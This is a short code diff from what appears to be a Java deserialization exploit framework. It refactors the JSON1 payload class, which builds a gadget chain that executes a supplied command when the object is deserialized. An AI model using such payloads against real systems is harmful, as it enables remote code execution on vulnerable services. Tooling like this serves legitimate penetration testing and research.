@@ -66,9 +66,9 @@ import net.sf.json.JSONObject;
     "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
     "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1" })
 @Authors({ Authors.MBECHLER })
-public class JSON1 implements ObjectPayload<Object> {
+public class JSON1 extends ExtendedObjectPayload<Object> {
 
-    public Map getObject ( String command ) throws Exception {
+    public Map getObject ( String[] command ) throws Exception {
         return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
     }
 
